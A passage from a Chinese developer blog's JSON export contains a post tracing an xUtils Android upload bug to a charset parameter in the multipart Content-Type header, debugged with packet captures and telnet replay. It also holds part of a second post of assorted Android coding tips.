10_9_1) AppleWebKit/537.73.11 (KHTML, like Gecko) Version/7.0.1 Safari/537.73.11</span></div><div class=\"line\"><span class=\"attribute\">Content-Length</span>: <span class=\"string\">233</span></div><div class=\"line\"><span class=\"attribute\">Content-Type</span>: <span class=\"string\">multipart/form-data; boundary=6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv</span></div><div class=\"line\"><span class=\"attribute\">Host</span>: <span class=\"string\">wwwcreturn.com</span></div><div class=\"line\"><span class=\"attribute\">Connection</span>: <span class=\"string\">Keep-Alive</span></div><div class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: <span class=\"string\">gzip</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"applescript\"><span class=\"comment\">--6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv</span></span></div><div class=\"line\">Content-Disposition: form-data; <span class=\"property\">name</span>=<span class=\"string\">\"file\"</span>; filename=<span class=\"string\">\"hello.txt\"</span></div><div class=\"line\">Content-Type: <span class=\"type\">application</span>/octet-stream</div><div class=\"line\">Content-Transfer-Encoding: binary</div><div class=\"line\"></div><div class=\"line\">hello upload</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">--6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv--</span></div></pre></td></tr></table></figure>\n\n<p>打开cmd 然后输入telnet www.creturn.com 80 然后黏贴进去看看效果</p>\n<p><img src=\"http://asset.creturn.com/asset/img/andriod-telnet.png\" alt=\"telnet post\"></p>\n<p>为了印证我们的才行可以把charset加上去和去掉的进行对比看看是不是加了之后就收不到上传文件的信息。</p>\n<p>其实根据HTTP协议来讲理论上加不加charset应该不会影响上传，但结果这个问题确实是由于charset引起的。</p>\n<p>接下来就简单了找到根源解决就行，在源码里面进行搜索 boundary ，找到地方根据作者写的方法注释掉其中添加charset的代码:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">protected</span> String <span class=\"title\">generateContentType</span>(</div><div class=\"line\">        <span class=\"keyword\">final</span> String boundary,</div><div class=\"line\">        <span class=\"keyword\">final</span> Charset charset) {</div><div class=\"line\">    StringBuilder buffer = <span class=\"keyword\">new</span> StringBuilder();</div><div class=\"line\">    buffer.append(<span class=\"string\">\"multipart/\"</span> + multipartSubtype + <span class=\"string\">\"; boundary=\"</span>);</div><div class=\"line\">    buffer.append(boundary);</div><div class=\"line\">    <span class=\"comment\">//这里就是需要注释掉的代码</span></div><div class=\"line\">    <span class=\"comment\">/*if (charset != null) {</span></div><div class=\"line\">        buffer.append(\"; charset=\");</div><div class=\"line\">        buffer.append(charset.name());</div><div class=\"line\">    }*/</div><div class=\"line\">    <span class=\"keyword\">return</span> buffer.toString();</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>好了搞定收工~~</p>\n","source":"_posts/android-上传php-xutils-bug修复分析过程.md","raw":"title: Android 上传PHP xUtils Bug修复分析过程\ndate: 2014-01-15 15:12:04\ntags:\n- Android\n- xUtils\n---\n\n##起因\n\n作为全职PHPer偶尔需要客串下Androider,最近公司的一个项目需要Android的客户端(主要图片特效处理及其上传)，自己就客串下Androider.\n\n之前有过Android开发经验所以做这个挺顺手的，几乎所有东西直接github中拿过来改改就用，不过在处理图片上传的时候选择了xUtils这个\n\n开源工具类,用起来确实比较好用，挺方便的，例如如下代码就可以实现上传:\n\n```java\nRequestParams params = new RequestParams();\nparams.addBodyParameter(\"file\", file);\nHttpUtils httpUtils = new HttpUtils();\nhttpUtils.send(HttpRequest.HttpMethod.POST, UPLOAD_URL, params, new RequestCallBack<String>() {\n    @Override\n    //上传失败处理方法\n    public void onFailure(HttpException arg0, String msg) {\n        alert(msg);\n    }\n    @Override\n    //上传进度处理\n    public void onLoading(long total, long current,\n            boolean isUploading) {\n        if (isUploading) {\n            Log.i(LOG_NAME, \"upload:\" + current + \"/\" + total);\n        }\n    }\n    @Override\n    //上传成功处理\n    public void onSuccess(ResponseInfo<String> responseInfo) {\n        alert(responseInfo.result);\n        Log.i(LOG_NAME, responseInfo.result);\n    }\n});\n```\n可以看到用起来比较方便，如果自己写还是比较麻烦的。不过最让人头疼的不是使用方法，而是作为接收端为PHP的话是接收不到上传的文件，最后经证实\n不仅仅是PHP C# 也有问题, 网上搜素了下不少人都遇到问题不过没有解决方案，看来只能自己动手解决了\n<!--more-->\n##问题分析\n\n既然要解决问题，那么就需要分析bug可能出现的地方，既然是HTTP上传那么我们得知道在PHP 在HTTP协议中文件是怎么处理上传的，直接在官方文档\n就可以找到\n\n>PHP 能够接受任何来自符合 RFC-1867 标准的浏览器（包括 Netscape Navigator 3 及更高版本，打了补丁的 Microsoft Internet Explorer 3 或者更高版本）上传的文件。\n\n这个是PHP官方文档中给出的解释, PHP在处理上传的时候遵循的是RFC-1867标准，那么我们接下来看看什么是RFC-1867。\n\n这里我给出一个RFC-1867的说明文档地址 [RFC-1867 说明](http://www.ietf.org/rfc/rfc1867.txt)，太长了就不放在这里了只拿核心重点内容过来看看：\n\n```http\n# The client might send back the following data use POST method:\n\nContent-type: multipart/form-data, boundary=AaB03x\n\n--AaB03x\ncontent-disposition: form-data; name=\"field1\"\n\nJoe Blow\n--AaB03x\ncontent-disposition: form-data; name=\"pics\"; filename=\"file1.txt\"\nContent-Type: text/plain\n\n ... contents of file1.txt ...\n--AaB03x--\n```\n这里通俗点讲，RFC-1867通过HTTP协议传输特定的格式来实现上传文件,比如我们上传一个文件名字叫做hello.txt的文本到服务端，那么发起请求的HTTP格式应该就如下：\n\n```http\nPOST /up.php HTTP/1.1\nHost: creturn.com\nContent-Length: 294\nContent-type: multipart/form-data, boundary=AaB03x\n\n--AaB03x\ncontent-disposition: form-data; name=\"file\"; filename=\"hello.txt\"\nContent-Type: text/plain\n\nhello\n--AaB03x--\n```\n\n这里HTTP头部协议没有写完整只是为了说明问题写的格式。在这些描述信息中\n1. 第一个Content-type（http头部描述信息）值multipart/form-data 是告诉服务器此次发送的数据是上传文件数据, boundary是告诉服务器文件数据之间分割标示符是 AaB03x\n2. 在HTTP body数据中以--AaB03x 分割多个文件，每个分隔符下面的描述信息是作为上传文件的描述信息\n3. 发送结束后需要以分隔符加“--”符号进行标示\n\n如果这三点没有问题那么就能正确上传，当然次实例中肯定不成功因为HTTP头部协议描述信息简短切不争取（比如长度）\n\n##解决过程\n\n既然上面已经对问题进行分析了，同样也知道了只要发送过程是按照RFC-1867的标准进行发送那么至少PHP是能够接收到上传的文件，那么接下来我们要解决的就是如果判断\n\n或者查看xUtils发送文件过程中是否遵循了RFC-1867标准\n\n那么如何查看xUtils是否发送了正确的数据格式？ 有两种方案，一个是利用代理工具抓包，另外一个方案就是直接抓包\n\n这里就说说直接抓包，代理抓包可以google一大堆。\n\npc 上面建立无线热点分享给手机，这样所有的数据都通过电脑走，不会用pc分享热点的google一大堆，或者为了偷懒买个传说中的mini WIFI都行\n\n抓包工具window推荐smartSniff, linux或者os x直接就tcpdump也行\n\n先写个简单的app装到手机上这里给出上传代码：\n\n```java\nString UPLOAD_URL = \"http://www.creturn.com/up.php\";\nFile file = new File(Environment.getExternalStorageDirectory() ,\"hello.txt\");\nRequestParams params = new RequestParams();\nparams.addBodyParameter(\"file\", file);\nHttpUtils httpUtils = new HttpUtils();\nhttpUtils.send(HttpRequest.HttpMethod.POST, UPLOAD_URL, params, new RequestCallBack<String>() {\n    @Override\n    //上传失败处理方法\n    public void onFailure(HttpException arg0, String msg) {\n        alert(msg);\n    }\n    @Override\n    //上传进度处理\n    public void onLoading(long total, long current,\n            boolean isUploading) {\n        if (isUploading) {\n            Log.i(LOG_NAME, \"upload:\" + current + \"/\" + total);\n        }\n    }\n    @Override\n    //上传成功处理\n    public void onSuccess(ResponseInfo<String> responseInfo) {\n        alert(responseInfo.result);\n        Log.i(LOG_NAME, responseInfo.result);\n    }\n});\n```\n上面代码作用是把sdcard根目录的hello.txt文件上传到UPLOAD_URL, 所以在sdcard根目录放一个hello.txt文件里面内容随便写点\n\nphp服务端这边就直接打印上传的文件信息就行，代码很简单:\n\n```php\n<?php\nprint_r($_FILES);\n?>\n```\n如果上传成功就会反馈上传文件的信息，写好app装到手机连接好wifi然后在pc上面抓包，我这里用的是smart sniffer\n\n- 抓包\n\n 1. 打开smart sniffer \n 2. 选择菜单 Options -> Capture Options \n 3. 选择你分享wifi的网卡\n 4. 确定点击开始抓包\n \n 在手机app上操作上传文件时候就可以看到抓包工具中已经有相应的http数据，抓包工具会对所有流量抓取所以如果有其他包干扰还可以\n \n 设置相应的过滤规则，这里就不阐述google就能找到\n \n 看看我们抓到的包内容:\n \n![smart sniffer抓包内容](http://asset.creturn.com/asset/img/android_sniffer.png)\n\n图种可以看到我们上传的HTTP包信息，不过很明显反馈的信息提示是没有上传成功的。\n\n那么接下来我们怎么去分析这个？怎么去排查问题？很多人应该能够想到，要是有个正确参照物不就很容易分析出问题出处？\n\n那么我们在建立一个html文件用浏览器同样上传sdcard里面的hello.txt文件,html内容如下:\n\n```html\n<html>\n<body>\n\n<form action=\"http://www.creturn.com/up.php\" method=\"post\" enctype=\"multipart/form-data\">\n<label for=\"file\">Filename:</label>\n<input type=\"file\" name=\"file\" id=\"file\" /> \n<br />\n<input type=\"submit\" name=\"submit\" value=\"Submit\" />\n</form>\n\n</body>\n</html>\n```\n 用同样的方法抓包看看正确的包内容是什么样的:\n \n ```http\nPOST /up.php HTTP/1.1\nHost: www.creturn.com\nConnection: keep-alive\nContent-Length: 294\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: http://222.73.234.196\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIexdOW8e2EZyciDK\nReferer: http://222.73.234.196/up.html\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: zh-CN,zh;q=0.8\n\n------WebKitFormBoundaryIexdOW8e2EZyciDK\nContent-Disposition: form-data; name=\"file\"; filename=\"hello.txt\"\nContent-Type: text/plain\n\nhello upload\n------WebKitFormBoundaryIexdOW8e2EZyciDK\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit\n------WebKitFormBoundaryIexdOW8e2EZyciDK--\n ```\n 可以看到处理HTTP头部描述信息和包体里面多了一个Submit，几乎一样\n \n之前说过上传过程中的几个重点，然后对比下我们发现Content-Type描述信息多了一个charset字符编码描述信息\n\n那么要做测试的话肯定就要把不同的地方去掉，然后对包进行回放看看是否成功\n\n>包回放指的是包数据包重新发送一次\n\n回放数据包有两种方法，一种直接修改xUtils源码重新上传。这里说一个简单的方法window自带的telnet ,用telnet 链接服务器80端口\n\n手动发送数据\n>注意： windows7默认没有安装需要在控制面板->程序和功能->打开或者关闭windows功能中开启\n\n如何进行手动发送？按照我们之前的想法去掉charset描述信息然后手动发送，那么先去掉charset信息后的包内容放入记事本:\n\n```http\nPOST /up.php HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.73.11 (KHTML, like Gecko) Version/7.0.1 Safari/537.73.11\nContent-Length: 233\nContent-Type: multipart/form-data; boundary=6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv\nHost: wwwcreturn.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\n\n--6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv\nContent-Disposition: form-data; name=\"file\"; filename=\"hello.txt\"\nContent-Type: application/octet-stream\nContent-Transfer-Encoding: binary\n\nhello upload\n\n--6wYgRevA02R_Uy4EJP31EcIJtsBlZtRv--\n```\n打开cmd 然后输入telnet www.creturn.com 80 然后黏贴进去看看效果\n\n![telnet post](http://asset.creturn.com/asset/img/andriod-telnet.png)\n\n为了印证我们的才行可以把charset加上去和去掉的进行对比看看是不是加了之后就收不到上传文件的信息。\n\n其实根据HTTP协议来讲理论上加不加charset应该不会影响上传，但结果这个问题确实是由于charset引起的。\n\n接下来就简单了找到根源解决就行，在源码里面进行搜索 boundary ，找到地方根据作者写的方法注释掉其中添加charset的代码:\n\n```java\n    protected String generateContentType(\n            final String boundary,\n            final Charset charset) {\n        StringBuilder buffer = new StringBuilder();\n        buffer.append(\"multipart/\" + multipartSubtype + \"; boundary=\");\n        buffer.append(boundary);\n        //这里就是需要注释掉的代码\n        /*if (charset != null) {\n            buffer.append(\"; charset=\");\n            buffer.append(charset.name());\n        }*/\n        return buffer.toString();\n    }\n\n\n```\n\n好了搞定收工~~\n","slug":"android-上传php-xutils-bug修复分析过程","updated":1421659126000,"excerpt":"<h2 id=\"起因\">起因</h2>\n<p>作为全职PHPer偶尔需要客串下Androider,最近公司的一个项目需要Android的客户端(主要图片特效处理及其上传)，自己就客串下Androider.</p>\n<p>之前有过Android开发经验所以做这个挺顺手的，几乎所有东西直接github中拿过来改改就用，不过在处理图片上传的时候选择了xUtils这个</p>\n<p>开源工具类,用起来确实比较好用，挺方便的，例如如下代码就可以实现上传:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\">RequestParams params = <span class=\"keyword\">new</span> RequestParams();</div><div class=\"line\">params.addBodyParameter(<span class=\"string\">\"file\"</span>, file);</div><div class=\"line\">HttpUtils httpUtils = <span class=\"keyword\">new</span> HttpUtils();</div><div class=\"line\">httpUtils.send(HttpRequest.HttpMethod.POST, UPLOAD_URL, params, <span class=\"keyword\">new</span> RequestCallBack&lt;String&gt;() {</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传失败处理方法</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onFailure</span>(HttpException arg0, String msg) {</div><div class=\"line\">        alert(msg);</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传进度处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onLoading</span>(<span class=\"keyword\">long</span> total, <span class=\"keyword\">long</span> current,</div><div class=\"line\">            <span class=\"keyword\">boolean</span> isUploading) {</div><div class=\"line\">        <span class=\"keyword\">if</span> (isUploading) {</div><div class=\"line\">            Log.i(LOG_NAME, <span class=\"string\">\"upload:\"</span> + current + <span class=\"string\">\"/\"</span> + total);</div><div class=\"line\">        }</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传成功处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onSuccess</span>(ResponseInfo&lt;String&gt; responseInfo) {</div><div class=\"line\">        alert(responseInfo.result);</div><div class=\"line\">        Log.i(LOG_NAME, responseInfo.result);</div><div class=\"line\">    }</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p>可以看到用起来比较方便，如果自己写还是比较麻烦的。不过最让人头疼的不是使用方法，而是作为接收端为PHP的话是接收不到上传的文件，最后经证实<br>不仅仅是PHP C# 也有问题, 网上搜素了下不少人都遇到问题不过没有解决方案，看来只能自己动手解决了<br>","_id":"u0k2wf7e2iqh7lfn","categories":[],"comments":true,"layout":"post","photos":[],"link":""},{"title":"android最近问题总结 ","id":296,"date":1374733673000,"tags":["2p7ln21w7mspwye0"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>1. 主线线程中更新UI<br>由于android的限制，不允许在主线程中对UI进行修改操作，必须要再新线程中。其实这点和lpython 的pyGtk很相似，估计都同为linux的产物。<br>自己更新UI的方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//先声明一个Handler，用来接收消息</span></div><div class=\"line\"><span class=\"keyword\">private</span> Handler messageHandler;</div><div class=\"line\"><span class=\"comment\">//消息标识</span></div><div class=\"line\"><span class=\"keyword\">private</span> finalist UPDATE_UI = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\">messageHandler = <span class=\"keyword\">new</span> Handler() {</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleMessage</span>(Message msg) {</div><div class=\"line\">    <span class=\"keyword\">if</span> (msg.what == UPDATE_UI) {</div><div class=\"line\">        updateUI(); <span class=\"comment\">//更新UI的方法</span></div><div class=\"line\">    }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>其中updateUI()方法中写自己需要更新的方法就行<br>那么如何触发？ 当然是发送消息了~<br>在需要更新的操作地方直接发送消息给handler就可以更新UI操作了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">messageHandler.sendEmptyMessageDelayed(UPDATE_UI, <span class=\"number\">1000</span>);</div></pre></td></tr></table></figure>\n\n<p>2.有时候在2.3的系统上测试正常的代码发放到4.0的系统上直接报网络错误，其实从3.0开始android是不允许在主线程中直接进行耗时操作如网络访问，所以还是需要在线程中进行网络操作。<br>自己用到的方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//先声明一个Runnable，然后实现它的Run（）接口,在Runnable里面写自己的业务逻辑，如网络访问</span></div><div class=\"line\">Runnable loginRunnable = <span class=\"keyword\">new</span> Runnable() {</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span>() {</div><div class=\"line\"><span class=\"comment\">//这里书写业务逻辑</span></div><div class=\"line\">}};</div><div class=\"line\"><span class=\"comment\">//启动个新线程执行Runnable</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">new</span> Thread(loginRunnable).start();</div><div class=\"line\">其实自己用的最多的还是定义相关操作类，继承Runnable并且实现它的run接口</div><div class=\"line\">还有一个Runable错误具体忘记了，不过在run开始前和结束前加上这两个方法就OK</div><div class=\"line\"><span class=\"comment\">//开始前</span></div><div class=\"line\">Looper.prepare();</div><div class=\"line\"><span class=\"comment\">//结束前</span></div><div class=\"line\">Looper.loop();</div></pre></td></tr></table></figure>\n\n<p>3.json操作，android自带json处理方法，自己用的最多的是解析字符串json为对象。具体处理方法如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">String jsonStr = &quot;{status:<span class=\"number\">1</span>, username:<span class=\"string\">'creturn'</span>}&quot;;</div><div class=\"line\"><span class=\"comment\">//定义一个JSONToken加载json字符串</span></div><div class=\"line\">JSONTokener jsonTokener = <span class=\"keyword\">new</span> JSONTokener(jsonStr);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//定义json对象，从TOkenr中取得json</span></div><div class=\"line\">JSONObject jsonObject = <span class=\"keyword\">null</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//使用此方法可取得json对象</span></div><div class=\"line\">jsonObject = (JSONObject) jsonTokener.nextValue();</div><div class=\"line\">例如要获取username可以这样获取</div><div class=\"line\">jsonObject.getString(&quot;username&quot;)</div></pre></td></tr></table></figure>\n\n<p>4.android里面读取assets目录下的文件<br>在activity里面或者能够访问到context的地方都行，最终用到里面的一个方法是：<br>getResources()</p>\n<p>它会返回一个资源访问类，在里面有诸多访问资源的方法，我们用到的是里面的<br>getAssets()</p>\n<p>用词方法里面会返回一个assetsManger类，通过assetsManger类里面的open方法就可以访问并返回一个InputStream<br>这样就可以对输入流进行操作了。具体代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">InputStream is = _conContext.getResources().getAssets().open(LOGIN_VIEW_BACKGROUND);</div></pre></td></tr></table></figure>\n\n<p>其中—conContext是context类如果在activity里面就可以直接使用getResources方法<br>5.androi里面的layout纯代码操作，由于最近有一个项目比较特殊，需要打包成Jar给别人使用，但是又不能把过多的内容暴露在外面，<br>所以传统的在xml布局文件中得方法不得不放弃，采用纯代码写布局。<br>layout的操作，例如设置其参数默认layout里面没有的方法，那么就需要用到相应的layoutParms类来实现，例如给一个layout设置布局为宽度大小根据内容而定，高度一样根据内容来自适应那么代码就如下（以linnerlayout为例）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//定义linearlayoutParms参数</span></div><div class=\"line\">LinearLayout.LayoutParams layout_params = <span class=\"keyword\">new</span> LinearLayout.LayoutParams(</div><div class=\"line\">LinearLayout.LayoutParams.WRAP_CONTENT,</div><div class=\"line\"></div><div class=\"line\">LinearLayout.LayoutParams.WRAP_CONTENT);</div><div class=\"line\"><span class=\"comment\">//如果需要LinearLayout居中显示可以设置其gravity</span></div><div class=\"line\">layout_params.gravity = Gravity.CENTER|Gravity.CENTER_HORIZONTAL|Gravity.CENTER_VERTICAL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//设置参数</span></div><div class=\"line\">LinearLayout.setLayoutParams(layout_params);</div></pre></td></tr></table></figure>\n\n<p>6.纯代码绘制view的背景，并用指定图片进行平铺操作<br>首先用指定代码进行平铺那么就需要读取图片资源，就可以用到上面介绍的方法读取一个inputstream</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">InputStream is = _conContext.getResources().getAssets().open(&quot;图片地址&quot;);</div></pre></td></tr></table></figure>\n\n<p>注意这里的图片是放在assets目录下面<br>由于所有的view最终不管你是用什么方式修改其背景，最终都会转换成drawble进行绘制，所以吧inputstream转换成一个drawable就行，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//从inputstream里面生成BitMapDrawable</span></div><div class=\"line\">BitmapDrawable bitmapDrawable = (BitmapDrawable) BitmapDrawable.createFromStream(is, <span class=\"keyword\">null</span>);</div><div class=\"line\"><span class=\"comment\">//这里设置其位纵横repeat也就是平铺</span></div><div class=\"line\">bitmapDrawable.setTileModeXY(TileMode.REPEAT, TileMode.REPEAT);</div><div class=\"line\"><span class=\"comment\">//设置背景</span></div><div class=\"line\"></div><div class=\"line\">setBackgroundDrawable((Drawable) bitmapDrawable);</div></pre></td></tr></table></figure>\n\n<p>7.  EditView编辑框中怎么定义其只允许输入指定的内容 ？ 其实如果是xml布局的话很简单，只要设置它的一个参数digits参数就行<br>但是悲剧的我只能用代码，那么怎么处理，其实不管是任何一个平台或者相应的和GUI有关的开发，第一个应该想到的就是它的事件，肯定有有关change的事件。在事件发生的适合判断输入的内容是否在允许范围内就行。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\">txt_username.addTextChangedListener(<span class=\"keyword\">new</span> TextWatcher() {</div><div class=\"line\">String tmp = &quot;&quot;; <span class=\"comment\">//只允许输入的字符</span></div><div class=\"line\">String digits = &quot;@._0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLIMNOPQRSTUVWXYZ&quot;;</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onTextChanged</span>(CharSequence s, <span class=\"keyword\">int</span> start, <span class=\"keyword\">int</span> before, <span class=\"keyword\">int</span> count) {</div><div class=\"line\">}</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">beforeTextChanged</span>(CharSequence s, <span class=\"keyword\">int</span> start, <span class=\"keyword\">int</span> count,<span class=\"keyword\">int</span> after) {</div><div class=\"line\">}</div><div class=\"line\"><span class=\"annotation\">@Override</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterTextChanged</span>(Editable s) {</div><div class=\"line\">String str = s.toString();</div><div class=\"line\"><span class=\"keyword\">if</span>(str.equals(tmp)){</div><div class=\"line\"><span class=\"keyword\">return</span>;</div><div class=\"line\">}</div><div class=\"line\">StringBuffer sb = <span class=\"keyword\">new</span> StringBuffer();</div><div class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &amp;lt; str.length(); i++){</div><div class=\"line\"><span class=\"keyword\">if</span>(digits.indexOf(str.charAt(i)) &amp;gt;= <span class=\"number\">0</span>){</div><div class=\"line\">sb.append(str.charAt(i));</div><div class=\"line\">}</div><div class=\"line\">}</div><div class=\"line\">tmp = sb.toString();</div><div class=\"line\">txt_username.setText(tmp);</div><div class=\"line\">txt_username.requestFocus();</div><div class=\"line\">txt_username.setSelection(tmp.length());</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p>8. WebView 在制作sdk过程中其中一个过程需要用到webview，这个webview就是用来访问http。但是使用过程中也碰到一些问题，比如在实例化一个WebView的时候，通常根据他它的参数提示，创建的时候就直接传递Context就行，但是，如果用这样创建的webview来访问http的页面，当再次点击里面的链接的时候就直接报错，所以解决方法就行hi生成webview的时候把当前activiy传递进去，大妈如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">WebView webView = <span class=\"keyword\">new</span> WebView(<span class=\"keyword\">this</span>);</div></pre></td></tr></table></figure>\n\n<p>但是新的问题由来了，虽然不报错了可是所有打开的链接都是通过默认浏览器来执行了，这个显然不是我要的结果，解决方法就是设置一个WebViewClient进行相应的方法重写来实现，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//获取webview的setting</span></div><div class=\"line\">WebSettings webset = webView.getSettings();</div><div class=\"line\"><span class=\"comment\">//启用javascript的支持，不然js就不起作用了</span></div><div class=\"line\">webset.setJavaScriptEnabled(<span class=\"keyword\">true</span>);<span class=\"comment\">// 添加web view client ,监听里面的事件webView.setWebViewClient(new WebViewClient() {</span></div><div class=\"line\"><span 